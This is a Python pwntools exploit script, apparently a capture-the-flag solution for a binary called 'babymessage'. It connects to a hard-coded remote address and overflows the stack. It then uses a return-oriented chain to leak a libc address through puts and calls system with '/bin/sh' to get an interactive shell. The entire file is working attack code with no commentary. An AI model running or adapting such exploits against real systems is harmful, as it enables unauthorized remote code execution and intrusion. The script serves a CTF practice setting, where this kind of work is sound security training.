#!/usr/bin/env python
#-*- coding:utf-8 -*-
# Author: I0gan

from pwn import *
#from LibcSearcher import LibcSearcher

context.log_level='debug'
#context(arch = 'i386', os = 'linux', log_level='debug')
#context(arch = 'amd64', os = 'linux', log_level='debug')

exeFile = 'babymessage'
#libFile = '/lib/x86_64-linux-gnu/libc.so.6'
libFile = './libc-2.27.so'

remoteIp = "123.56.170.202"
remotePort = 21342

LOCAL = 0
LIB   = 1

r   =  lambda x : io.recv(x)
ra  =  lambda   : io.recvall()
rl  =  lambda   : io.recvline(keepends = True)
ru  =  lambda x : io.recvuntil(x, drop = True)
s   =  lambda x : io.send(x)
sl  =  lambda x : io.sendline(x)
sa  =  lambda x, y : io.sendafter(x, y)
sla =  lambda x, y : io.sendlineafter(x, y)
ia  =  lambda : io.interactive()
c   =  lambda : io.close()
li    = lambda x : log.info(x)
db    = lambda   : gdb.attach(io)


#--------------------------Exploit--------------------------
def exploit():
	leak_fun = 'puts'
	dp_fun = 'puts'
	pop_rdi = 0x400ac3
	start = 0x4006e0
	offset = 0x8

	sla(':', '1')
	sa(':', p32(0x101))
	sla(':', '2')
	sa(':', 'B' * 0x8 + p64(0x6010d0 + 4))

	sla(':', '2')

	ru(':')
	p = 'A' * offset
	p += p64(0)
	p += p64(pop_rdi)
	p += p64(exe.got[leak_fun])
	p += p64(exe.plt[dp_fun])
	p += p64(start)
	#db()
	s(p)

	leak = u64(ru('\x7f')[-5:] + '\x7f\x00\x00')
	li('leak ' + hex(leak))
	libc_base = leak - lib.sym[leak_fun]
	li('libc_base ' + hex(libc_base))

	libc_sys = libc_base + lib.sym['system']
	libc_sh = libc_base + 0x00000000001b40fa


	sla(':', '1')
	sa(':', p32(0x101))
	sla(':', '2')
	sa(':', 'B' * 0x8 + p64(0x6010d0 + 4))

	sla(':', '2')
	p = 'A' * offset
	p += p64(0)
	p += p64(0x400809)
	p += p64(pop_rdi)
	p += p64(libc_sh)
	p += p64(libc_sys)
	p += p64(0)
	#db()
	s(p)


def finish():
	ia()
	c()

#--------------------------Main-----------------------------
if __name__ == '__main__':
	
	if LOCAL:
		exe = ELF(exeFile)
		if LIB:
			lib = ELF(libFile)
			io = exe.process(env = {"LD_PRELOAD" : libFile})
		else:
			io = exe.process()
	
	else:
		exe = ELF(exeFile)
		io = remote(remoteIp, remotePort)
		if LIB:
			lib = ELF(libFile)
	
	exploit()
	finish()
